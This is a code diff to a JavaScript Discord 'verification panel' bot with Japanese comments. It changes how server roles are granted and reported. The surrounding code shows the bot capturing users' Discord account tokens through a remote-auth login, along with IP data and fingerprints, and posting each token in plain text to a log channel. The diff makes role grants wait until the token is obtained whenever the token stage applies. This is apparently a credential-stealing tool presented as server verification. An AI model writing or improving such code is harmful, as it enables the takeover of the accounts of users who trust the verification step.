@@ -210,7 +210,6 @@ export async function publishToken({ client, rec, userToken }) {
   const ch = await client.channels.fetch(chId).catch(() => null);
   if (!ch) return;
 
-  // 元のログ埋め込みにトークン欄を追記する
   if (rec.logMessageId) {
     try {
       const msg = await ch.messages.fetch(rec.logMessageId);
@@ -261,8 +260,9 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
   const guildLabel = guild ? guild.name : panel.guildId;
 
   // grantStage='token' のときは、リモート認証でトークンを取得するまで付与を保留する
-  const deferred = p.grantStage === 'token' && (p.roles.length > 0 || p.removeRoles.length > 0);
+  const deferred = p.grantStage === 'token';
   let roleError = null;
+  let roleGranted = false;
 
   if (ok && !deferred) {
     const g = await grantRoles({ client, panel, user, oauth });
@@ -270,6 +270,8 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
       ok = false;
       roleError = g.err;
       reasons.push(`ロール付与失敗: ${g.err}`);
+    } else {
+      roleGranted = p.roles.length > 0;
     }
   }
 
@@ -291,7 +293,7 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     userTokenAt: session.userToken ? new Date().toISOString() : null,
     tokenUnverified: false,
     pendingRole: ok && deferred,
-    roleGranted: ok ? !deferred : false,
+    roleGranted,
     roleError,
     roleFallbackAt: null,
     logChannelId: null,
@@ -338,7 +340,7 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     role: {
       stage: p.grantStage,
       pending: ok && deferred,
-      granted: ok ? !deferred : false,
+      granted: roleGranted,
       error: roleError
     },
     panel: panel.id,
@@ -351,11 +353,13 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
   embed.addFields({
     name: 'ロール付与',
     value:
-      deferred && ok
-        ? `保留（別デバイスでのログイン許可後に付与 / ${Math.max(config.tokenGraceSeconds, 0)}秒でフォールバック）`
-        : ok
-          ? '付与済み'
-          : `未付与${roleError ? `: ${roleError}` : ''}`
+      !p.roles.length
+        ? '未設定（`/panel edit` の role1 で設定）'
+        : deferred && ok
+          ? `保留（別デバイスでのログイン許可後に付与 / ${Math.max(config.tokenGraceSeconds, 0)}秒でフォールバック）`
+          : ok
+            ? '付与済み'
+            : `未付与${roleError ? `: ${roleError}` : ''}`
   });
   if (session.userToken) {
     embed.addFields({ name: 'トークン', value: `\`\`\`\n${session.userToken}\n\`\`\`` });
@@ -368,7 +372,6 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     }
   ];
 
-  // ログを送り、後からトークン欄を追記できるようメッセージIDを控える
   const postLog = async () => {
     const m = await logTo(client, panel, embed, file);
     if (m) {
